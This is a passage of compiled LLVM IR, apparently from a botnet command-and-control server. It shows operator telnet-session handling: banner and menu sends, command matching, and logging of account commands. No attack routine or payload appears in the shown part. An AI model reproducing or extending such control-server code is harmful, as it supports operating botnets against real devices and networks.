  %254 = call i64 @send(i32 %250, i8* %251, i64 %253, i32 16384)
  %255 = icmp eq i64 %254, -1
  br i1 %255, label %256, label %257

256:                                              ; preds = %249
  br label %701

257:                                              ; preds = %249
  %258 = call i32 @sleep(i32 1)
  %259 = load i32, i32* %4, align 4
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %262 = call i64 @strlen(i8* %261) #8
  %263 = call i64 @send(i32 %259, i8* %260, i64 %262, i32 16384)
  %264 = icmp eq i64 %263, -1
  br i1 %264, label %265, label %266

265:                                              ; preds = %257
  br label %701

266:                                              ; preds = %257
  %267 = load i32, i32* %4, align 4
  %268 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %269 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %270 = call i64 @strlen(i8* %269) #8
  %271 = call i64 @send(i32 %267, i8* %268, i64 %270, i32 16384)
  %272 = icmp eq i64 %271, -1
  br i1 %272, label %273, label %274

273:                                              ; preds = %266
  br label %701

274:                                              ; preds = %266
  %275 = call i32 @sleep(i32 1)
  %276 = load i32, i32* %4, align 4
  %277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %279 = call i64 @strlen(i8* %278) #8
  %280 = call i64 @send(i32 %276, i8* %277, i64 %279, i32 16384)
  %281 = icmp eq i64 %280, -1
  br i1 %281, label %282, label %283

282:                                              ; preds = %274
  br label %701

283:                                              ; preds = %274
  %284 = load i32, i32* %4, align 4
  %285 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %286 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %287 = call i64 @strlen(i8* %286) #8
  %288 = call i64 @send(i32 %284, i8* %285, i64 %287, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

290:                                              ; preds = %283
  br label %701

291:                                              ; preds = %283
  %292 = call i32 @sleep(i32 1)
  %293 = load i32, i32* %4, align 4
  %294 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %296 = call i64 @strlen(i8* %295) #8
  %297 = call i64 @send(i32 %293, i8* %294, i64 %296, i32 16384)
  %298 = icmp eq i64 %297, -1
  br i1 %298, label %299, label %300

299:                                              ; preds = %291
  br label %701

300:                                              ; preds = %291
  br label %308

301:                                              ; preds = %111
  br label %302

302:                                              ; preds = %301, %170
  %303 = load i32, i32* %4, align 4
  %304 = call i64 @send(i32 %303, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0), i64 5, i32 16384)
  %305 = icmp eq i64 %304, -1
  br i1 %305, label %306, label %307

306:                                              ; preds = %302
  br label %701

307:                                              ; preds = %302
  br label %701

308:                                              ; preds = %300
  %309 = load i8*, i8** %3, align 8
  %310 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %309) #9
  %311 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %312 = call i32 (i8*, i8*, ...) @sprintf(i8* %311, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i64 0, i64 0)) #9
  %313 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %314 = call i32 (i8*, i8*, ...) @sprintf(i8* %313, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0)) #9
  %315 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %316 = call i32 (i8*, i8*, ...) @sprintf(i8* %315, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.22, i64 0, i64 0)) #9
  %317 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %318 = call i32 (i8*, i8*, ...) @sprintf(i8* %317, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.23, i64 0, i64 0)) #9
  %319 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %320 = call i32 (i8*, i8*, ...) @sprintf(i8* %319, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.24, i64 0, i64 0)) #9
  %321 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %322 = call i32 (i8*, i8*, ...) @sprintf(i8* %321, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.25, i64 0, i64 0)) #9
  %323 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %324 = call i32 (i8*, i8*, ...) @sprintf(i8* %323, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.26, i64 0, i64 0)) #9
  %325 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %326 = call i32 (i8*, i8*, ...) @sprintf(i8* %325, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.27, i64 0, i64 0)) #9
  %327 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %328 = call i32 (i8*, i8*, ...) @sprintf(i8* %327, i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.28, i64 0, i64 0)) #9
  %329 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %330 = call i32 (i8*, i8*, ...) @sprintf(i8* %329, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0)) #9
  %331 = load i32, i32* %4, align 4
  %332 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %333 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %334 = call i64 @strlen(i8* %333) #8
  %335 = call i64 @send(i32 %331, i8* %332, i64 %334, i32 16384)
  %336 = icmp eq i64 %335, -1
  br i1 %336, label %337, label %338

337:                                              ; preds = %308
  br label %701

338:                                              ; preds = %308
  %339 = load i32, i32* %4, align 4
  %340 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %341 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %342 = call i64 @strlen(i8* %341) #8
  %343 = call i64 @send(i32 %339, i8* %340, i64 %342, i32 16384)
  %344 = icmp eq i64 %343, -1
  br i1 %344, label %345, label %346

345:                                              ; preds = %338
  br label %701

346:                                              ; preds = %338
  %347 = load i32, i32* %4, align 4
  %348 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %349 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %350 = call i64 @strlen(i8* %349) #8
  %351 = call i64 @send(i32 %347, i8* %348, i64 %350, i32 16384)
  %352 = icmp eq i64 %351, -1
  br i1 %352, label %353, label %354

353:                                              ; preds = %346
  br label %701

354:                                              ; preds = %346
  %355 = load i32, i32* %4, align 4
  %356 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %357 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %358 = call i64 @strlen(i8* %357) #8
  %359 = call i64 @send(i32 %355, i8* %356, i64 %358, i32 16384)
  %360 = icmp eq i64 %359, -1
  br i1 %360, label %361, label %362

361:                                              ; preds = %354
  br label %701

362:                                              ; preds = %354
  %363 = load i32, i32* %4, align 4
  %364 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %365 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %366 = call i64 @strlen(i8* %365) #8
  %367 = call i64 @send(i32 %363, i8* %364, i64 %366, i32 16384)
  %368 = icmp eq i64 %367, -1
  br i1 %368, label %369, label %370

369:                                              ; preds = %362
  br label %701

370:                                              ; preds = %362
  %371 = load i32, i32* %4, align 4
  %372 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %373 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %374 = call i64 @strlen(i8* %373) #8
  %375 = call i64 @send(i32 %371, i8* %372, i64 %374, i32 16384)
  %376 = icmp eq i64 %375, -1
  br i1 %376, label %377, label %378

377:                                              ; preds = %370
  br label %701

378:                                              ; preds = %370
  %379 = load i32, i32* %4, align 4
  %380 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %381 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %382 = call i64 @strlen(i8* %381) #8
  %383 = call i64 @send(i32 %379, i8* %380, i64 %382, i32 16384)
  %384 = icmp eq i64 %383, -1
  br i1 %384, label %385, label %386

385:                                              ; preds = %378
  br label %701

386:                                              ; preds = %378
  %387 = load i32, i32* %4, align 4
  %388 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %389 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %390 = call i64 @strlen(i8* %389) #8
  %391 = call i64 @send(i32 %387, i8* %388, i64 %390, i32 16384)
  %392 = icmp eq i64 %391, -1
  br i1 %392, label %393, label %394

393:                                              ; preds = %386
  br label %701

394:                                              ; preds = %386
  %395 = load i32, i32* %4, align 4
  %396 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %397 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %398 = call i64 @strlen(i8* %397) #8
  %399 = call i64 @send(i32 %395, i8* %396, i64 %398, i32 16384)
  %400 = icmp eq i64 %399, -1
  br i1 %400, label %401, label %402

401:                                              ; preds = %394
  br label %701

402:                                              ; preds = %394
  %403 = load i32, i32* %4, align 4
  %404 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %405 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %406 = call i64 @strlen(i8* %405) #8
  %407 = call i64 @send(i32 %403, i8* %404, i64 %406, i32 16384)
  %408 = icmp eq i64 %407, -1
  br i1 %408, label %409, label %410

409:                                              ; preds = %402
  br label %701

410:                                              ; preds = %402
  br label %411

411:                                              ; preds = %410
  %412 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %413 = load i32, i32* %5, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %414
  %416 = getelementptr inbounds %struct.login_info, %struct.login_info* %415, i32 0, i32 0
  %417 = getelementptr inbounds [100 x i8], [100 x i8]* %416, i64 0, i64 0
  %418 = call i32 (i8*, i8*, ...) @sprintf(i8* %412, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.29, i64 0, i64 0), i8* %417) #9
  %419 = load i32, i32* %4, align 4
  %420 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %421 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %422 = call i64 @strlen(i8* %421) #8
  %423 = call i64 @send(i32 %419, i8* %420, i64 %422, i32 16384)
  %424 = icmp eq i64 %423, -1
  br i1 %424, label %425, label %426

425:                                              ; preds = %411
  br label %701

426:                                              ; preds = %411
  br label %427

427:                                              ; preds = %426
  %428 = load i8*, i8** %3, align 8
  %429 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %428) #9
  %430 = load i32, i32* %4, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %431
  %433 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %432, i32 0, i32 0
  store i32 1, i32* %433, align 4
  br label %434

434:                                              ; preds = %667, %666, %645, %520, %427
  %435 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %436 = load i32, i32* %4, align 4
  %437 = call i32 @fdgets(i8* %435, i32 2048, i32 %436)
  %438 = icmp sgt i32 %437, 0
  br i1 %438, label %439, label %700

439:                                              ; preds = %434
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %441 = call i32 @strncmp(i8* %440, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i64 4) #8
  %442 = icmp eq i32 %441, 0
  br i1 %442, label %451, label %443

443:                                              ; preds = %439
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %445 = call i32 @strncmp(i8* %444, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i64 0, i64 0), i64 4) #8
  %446 = icmp eq i32 %445, 0
  br i1 %446, label %451, label %447

447:                                              ; preds = %443
  %448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %449 = call i32 @strncmp(i8* %448, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i64 0, i64 0), i64 4) #8
  %450 = icmp eq i32 %449, 0
  br i1 %450, label %451, label %521

451:                                              ; preds = %447, %443, %439
  %452 = load i8*, i8** %3, align 8
  %453 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %452) #9
  %454 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %455 = call i32 (i8*, i8*, ...) @sprintf(i8* %454, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.33, i64 0, i64 0)) #9
  %456 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %457 = call i32 (i8*, i8*, ...) @sprintf(i8* %456, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.34, i64 0, i64 0)) #9
  %458 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %459 = call i32 (i8*, i8*, ...) @sprintf(i8* %458, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.35, i64 0, i64 0)) #9
  %460 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %461 = call i32 (i8*, i8*, ...) @sprintf(i8* %460, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.36, i64 0, i64 0)) #9
  %462 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %463 = call i32 (i8*, i8*, ...) @sprintf(i8* %462, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.37, i64 0, i64 0)) #9
  %464 = load i32, i32* %4, align 4
  %465 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %466 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %467 = call i64 @strlen(i8* %466) #8
  %468 = call i64 @send(i32 %464, i8* %465, i64 %467, i32 16384)
  %469 = icmp eq i64 %468, -1
  br i1 %469, label %470, label %471

470:                                              ; preds = %451
  br label %701

471:                                              ; preds = %451
  %472 = load i32, i32* %4, align 4
  %473 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %474 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %475 = call i64 @strlen(i8* %474) #8
  %476 = call i64 @send(i32 %472, i8* %473, i64 %475, i32 16384)
  %477 = icmp eq i64 %476, -1
  br i1 %477, label %478, label %479

478:                                              ; preds = %471
  br label %701

479:                                              ; preds = %471
  %480 = load i32, i32* %4, align 4
  %481 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %482 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %483 = call i64 @strlen(i8* %482) #8
  %484 = call i64 @send(i32 %480, i8* %481, i64 %483, i32 16384)
  %485 = icmp eq i64 %484, -1
  br i1 %485, label %486, label %487

486:                                              ; preds = %479
  br label %701

487:                                              ; preds = %479
  %488 = load i32, i32* %4, align 4
  %489 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %490 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %491 = call i64 @strlen(i8* %490) #8
  %492 = call i64 @send(i32 %488, i8* %489, i64 %491, i32 16384)
  %493 = icmp eq i64 %492, -1
  br i1 %493, label %494, label %495

494:                                              ; preds = %487
  br label %701

495:                                              ; preds = %487
  %496 = load i32, i32* %4, align 4
  %497 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %498 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %499 = call i64 @strlen(i8* %498) #8
  %500 = call i64 @send(i32 %496, i8* %497, i64 %499, i32 16384)
  %501 = icmp eq i64 %500, -1
  br i1 %501, label %502, label %503

502:                                              ; preds = %495
  br label %701

503:                                              ; preds = %495
  %504 = load i8*, i8** %3, align 8
  %505 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %504) #9
  %506 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %507 = load i32, i32* %5, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %508
  %510 = getelementptr inbounds %struct.login_info, %struct.login_info* %509, i32 0, i32 0
  %511 = getelementptr inbounds [100 x i8], [100 x i8]* %510, i64 0, i64 0
  %512 = call i32 (i8*, i8*, ...) @sprintf(i8* %506, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.29, i64 0, i64 0), i8* %511) #9
  %513 = load i32, i32* %4, align 4
  %514 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %515 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %516 = call i64 @strlen(i8* %515) #8
  %517 = call i64 @send(i32 %513, i8* %514, i64 %516, i32 16384)
  %518 = icmp eq i64 %517, -1
  br i1 %518, label %519, label %520

519:                                              ; preds = %503
  br label %701

520:                                              ; preds = %503
  br label %434, !llvm.loop !19

521:                                              ; preds = %447
  %522 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %523 = call i32 @strncmp(i8* %522, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i64 5) #8
  %524 = icmp eq i32 %523, 0
  br i1 %524, label %537, label %525

525:                                              ; preds = %521
  %526 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %527 = call i32 @strncmp(i8* %526, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i64 0, i64 0), i64 5) #8
  %528 = icmp eq i32 %527, 0
  br i1 %528, label %537, label %529

529:                                              ; preds = %525
  %530 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %531 = call i32 @strncmp(i8* %530, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i64 0, i64 0), i64 3) #8
  %532 = icmp eq i32 %531, 0
  br i1 %532, label %537, label %533

533:                                              ; preds = %529
  %534 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %535 = call i32 @strncmp(i8* %534, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i64 0, i64 0), i64 3) #8
  %536 = icmp eq i32 %535, 0
  br i1 %536, label %537, label %646

537:                                              ; preds = %533, %529, %525, %521
  %538 = getelementptr inbounds [2048 x i8], [2048 x i8]* %43, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %538, i8 0, i64 2048, i1 false)
  %539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %43, i64 0, i64 0
  %540 = call i32 (i8*, i8*, ...) @sprintf(i8* %539, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i64 0, i64 0)) #9
  %541 = load i32, i32* %4, align 4
  %542 = getelementptr inbounds [2048 x i8], [2048 x i8]* %43, i64 0, i64 0
  %543 = getelementptr inbounds [2048 x i8], [2048 x i8]* %43, i64 0, i64 0
  %544 = call i64 @strlen(i8* %543) #8
  %545 = call i64 @send(i32 %541, i8* %542, i64 %544, i32 16384)
  %546 = icmp eq i64 %545, -1
  br i1 %546, label %547, label %548

547:                                              ; preds = %537
  br label %701

548:                                              ; preds = %537
  %549 = load i32, i32* %4, align 4
  %550 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %551 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %552 = call i64 @strlen(i8* %551) #8
  %553 = call i64 @send(i32 %549, i8* %550, i64 %552, i32 16384)
  %554 = icmp eq i64 %553, -1
  br i1 %554, label %555, label %556

555:                                              ; preds = %548
  br label %701

556:                                              ; preds = %548
  %557 = load i32, i32* %4, align 4
  %558 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %559 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %560 = call i64 @strlen(i8* %559) #8
  %561 = call i64 @send(i32 %557, i8* %558, i64 %560, i32 16384)
  %562 = icmp eq i64 %561, -1
  br i1 %562, label %563, label %564

563:                                              ; preds = %556
  br label %701

564:                                              ; preds = %556
  %565 = load i32, i32* %4, align 4
  %566 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %567 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %568 = call i64 @strlen(i8* %567) #8
  %569 = call i64 @send(i32 %565, i8* %566, i64 %568, i32 16384)
  %570 = icmp eq i64 %569, -1
  br i1 %570, label %571, label %572

571:                                              ; preds = %564
  br label %701

572:                                              ; preds = %564
  %573 = load i32, i32* %4, align 4
  %574 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %575 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %576 = call i64 @strlen(i8* %575) #8
  %577 = call i64 @send(i32 %573, i8* %574, i64 %576, i32 16384)
  %578 = icmp eq i64 %577, -1
  br i1 %578, label %579, label %580

579:                                              ; preds = %572
  br label %701

580:                                              ; preds = %572
  %581 = load i32, i32* %4, align 4
  %582 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %583 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %584 = call i64 @strlen(i8* %583) #8
  %585 = call i64 @send(i32 %581, i8* %582, i64 %584, i32 16384)
  %586 = icmp eq i64 %585, -1
  br i1 %586, label %587, label %588

587:                                              ; preds = %580
  br label %701

588:                                              ; preds = %580
  %589 = load i32, i32* %4, align 4
  %590 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %591 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %592 = call i64 @strlen(i8* %591) #8
  %593 = call i64 @send(i32 %589, i8* %590, i64 %592, i32 16384)
  %594 = icmp eq i64 %593, -1
  br i1 %594, label %595, label %596

595:                                              ; preds = %588
  br label %701

596:                                              ; preds = %588
  %597 = load i32, i32* %4, align 4
  %598 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %599 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %600 = call i64 @strlen(i8* %599) #8
  %601 = call i64 @send(i32 %597, i8* %598, i64 %600, i32 16384)
  %602 = icmp eq i64 %601, -1
  br i1 %602, label %603, label %604

603:                                              ; preds = %596
  br label %701

604:                                              ; preds = %596
  %605 = load i32, i32* %4, align 4
  %606 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %607 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %608 = call i64 @strlen(i8* %607) #8
  %609 = call i64 @send(i32 %605, i8* %606, i64 %608, i32 16384)
  %610 = icmp eq i64 %609, -1
  br i1 %610, label %611, label %612

611:                                              ; preds = %604
  br label %701

612:                                              ; preds = %604
  %613 = load i32, i32* %4, align 4
  %614 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %615 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %616 = call i64 @strlen(i8* %615) #8
  %617 = call i64 @send(i32 %613, i8* %614, i64 %616, i32 16384)
  %618 = icmp eq i64 %617, -1
  br i1 %618, label %619, label %620

619:                                              ; preds = %612
  br label %701

620:                                              ; preds = %612
  %621 = load i32, i32* %4, align 4
  %622 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %623 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %624 = call i64 @strlen(i8* %623) #8
  %625 = call i64 @send(i32 %621, i8* %622, i64 %624, i32 16384)
  %626 = icmp eq i64 %625, -1
  br i1 %626, label %627, label %628

627:                                              ; preds = %620
  br label %701

628:                                              ; preds = %620
  br label %629

629:                                              ; preds = %628
  %630 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %631 = load i32, i32* %5, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %632
  %634 = getelementptr inbounds %struct.login_info, %struct.login_info* %633, i32 0, i32 0
  %635 = getelementptr inbounds [100 x i8], [100 x i8]* %634, i64 0, i64 0
  %636 = call i32 (i8*, i8*, ...) @sprintf(i8* %630, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.29, i64 0, i64 0), i8* %635) #9
  %637 = load i32, i32* %4, align 4
  %638 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %639 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %640 = call i64 @strlen(i8* %639) #8
  %641 = call i64 @send(i32 %637, i8* %638, i64 %640, i32 16384)
  %642 = icmp eq i64 %641, -1
  br i1 %642, label %643, label %644

643:                                              ; preds = %629
  br label %701

644:                                              ; preds = %629
  br label %645

645:                                              ; preds = %644
  br label %434, !llvm.loop !19

646:                                              ; preds = %533
  %647 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %647)
  %648 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %649 = load i32, i32* %5, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %650
  %652 = getelementptr inbounds %struct.login_info, %struct.login_info* %651, i32 0, i32 0
  %653 = getelementptr inbounds [100 x i8], [100 x i8]* %652, i64 0, i64 0
  %654 = call i32 (i8*, i8*, ...) @sprintf(i8* %648, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.29, i64 0, i64 0), i8* %653) #9
  %655 = load i32, i32* %4, align 4
  %656 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %657 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %658 = call i64 @strlen(i8* %657) #8
  %659 = call i64 @send(i32 %655, i8* %656, i64 %658, i32 16384)
  %660 = icmp eq i64 %659, -1
  br i1 %660, label %661, label %662

661:                                              ; preds = %646
  br label %701

662:                                              ; preds = %646
  %663 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %664 = call i64 @strlen(i8* %663) #8
  %665 = icmp eq i64 %664, 0
  br i1 %665, label %666, label %667

666:                                              ; preds = %662
  br label %434, !llvm.loop !19

667:                                              ; preds = %662
  %668 = load i32, i32* %5, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %669
  %671 = getelementptr inbounds %struct.login_info, %struct.login_info* %670, i32 0, i32 0
  %672 = getelementptr inbounds [100 x i8], [100 x i8]* %671, i64 0, i64 0
  %673 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %674 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i64 0, i64 0), i8* %672, i8* %673)
  %675 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i64 0, i64 0))
  store %struct._IO_FILE* %675, %struct._IO_FILE** %46, align 8
  %676 = call i64 @time(i64* null) #9
  store i64 %676, i64* %47, align 8
  %677 = call %struct.tm* @gmtime(i64* %47) #9
  store %struct.tm* %677, %struct.tm** %48, align 8
  %678 = getelementptr inbounds [50 x i8], [50 x i8]* %49, i64 0, i64 0
  %679 = load %struct.tm*, %struct.tm** %48, align 8
  %680 = call i64 @strftime(i8* %678, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.45, i64 0, i64 0), %struct.tm* %679) #9
  %681 = load %struct._IO_FILE*, %struct._IO_FILE** %46, align 8
  %682 = getelementptr inbounds [50 x i8], [50 x i8]* %49, i64 0, i64 0
  %683 = load i32, i32* %5, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %684
  %686 = getelementptr inbounds %struct.login_info, %struct.login_info* %685, i32 0, i32 0
  %687 = getelementptr inbounds [100 x i8], [100 x i8]* %686, i64 0, i64 0
